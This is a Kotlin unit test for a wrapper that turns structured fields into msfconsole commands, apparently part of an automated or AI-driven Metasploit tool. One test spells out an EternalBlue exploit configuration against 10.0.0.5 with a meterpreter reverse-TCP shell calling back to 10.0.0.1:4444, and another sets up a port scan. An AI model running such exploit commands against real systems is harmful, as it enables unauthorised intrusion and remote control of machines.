package ai.droidcommand.metasploit

import ai.droidcommand.shell.ShellCommand
import ai.droidcommand.shell.ShellExecutionResult
import ai.droidcommand.shell.ShellExecutor
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertIs
import kotlin.test.assertTrue

private class ScriptedShellExecutor(private val result: ShellExecutionResult) : ShellExecutor {
    var lastCommand: ShellCommand? = null
        private set

    override fun execute(command: ShellCommand, isCancelled: () -> Boolean): ShellExecutionResult {
        lastCommand = command
        return result
    }
}

class ShellBackedMetasploitExecutorTest {
    @Test
    fun `isAvailable is true once a shell executor is configured`() {
        val executor = ShellBackedMetasploitExecutor(ScriptedShellExecutor(ShellExecutionResult.Success(0, "", "", 0)))
        assertTrue(executor.isAvailable())
    }

    @Test
    fun `builds a resource script from structured fields and dispatches via msfconsole -x`() {
        val shell = ScriptedShellExecutor(ShellExecutionResult.Success(0, "session opened", "", 500))
        val executor = ShellBackedMetasploitExecutor(shell)

        val command = MetasploitCommand(
            moduleType = MetasploitModuleType.EXPLOIT,
            modulePath = "exploit/windows/smb/ms17_010_eternalblue",
            target = MetasploitTarget("10.0.0.5", 445),
            payload = "payload/windows/x64/meterpreter/reverse_tcp",
            options = mapOf("LHOST" to "10.0.0.1", "LPORT" to "4444"),
        )

        val result = assertIs<MetasploitExecutionResult.Success>(executor.execute(command))
        assertEquals("session opened", result.stdout)

        val dispatched = shell.lastCommand
        assertEquals("msfconsole", dispatched?.executable)
        assertEquals(listOf("-q", "-x"), dispatched?.args?.take(2))
        val script = dispatched?.args?.get(2).orEmpty()
        assertTrue(script.contains("use exploit/windows/smb/ms17_010_eternalblue"))
        assertTrue(script.contains("set RHOSTS 10.0.0.5"))
        assertTrue(script.contains("set RPORT 445"))
        assertTrue(script.contains("set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp"))
        assertTrue(script.contains("set LHOST 10.0.0.1"))
        assertTrue(script.contains("set LPORT 4444"))
        assertTrue(script.contains("run -z"))
        assertTrue(script.contains("exit -y"))
    }

    @Test
    fun `surfaces a shell-level failure directly`() {
        val shell = ScriptedShellExecutor(ShellExecutionResult.Failure("msfconsole not found"))
        val executor = ShellBackedMetasploitExecutor(shell)
        val command = MetasploitCommand(
            moduleType = MetasploitModuleType.AUXILIARY,
            modulePath = "auxiliary/scanner/portscan/tcp",
            target = MetasploitTarget("10.0.0.5"),
        )
        val result = assertIs<MetasploitExecutionResult.Failure>(executor.execute(command))
        assertEquals("msfconsole not found", result.reason)
    }
}
